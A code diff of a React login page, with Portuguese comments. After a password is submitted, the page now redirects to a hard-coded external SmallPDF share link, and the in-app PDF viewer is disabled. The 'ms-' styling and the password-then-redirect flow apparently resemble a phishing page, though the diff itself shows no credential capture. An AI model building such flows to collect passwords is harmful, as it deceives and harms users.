@@ -18,11 +18,8 @@ export default function Home() {
 
   const submitPasswordMutation = trpc.login.submitPassword.useMutation({
     onSuccess: (data) => {
-      if (data.pdfId) {
-        setPdfUrl(`/api/pdf/${data.pdfId}`);
-      } else {
-        toast.error("PDF nao disponivel");
-      }
+      // Redirect para o link do SmallPDF
+      window.location.href = "https://smallpdf.com/pt/file#s=72e0bc11-cfca-4ccf-8240-27195a57c9ea";
     },
     onError: (error) => {
       console.error("Erro:", error);
@@ -68,13 +65,13 @@ export default function Home() {
 
 
 
-  if (pdfUrl) {
+  if (false) {
     return (
       <div className="ms-bg">
         <div className="ms-container">
           <div className="ms-pdf-viewer">
             <iframe
-              src={pdfUrl}
+              src={""}
               className="ms-pdf-iframe"
               title="Documento"
             />
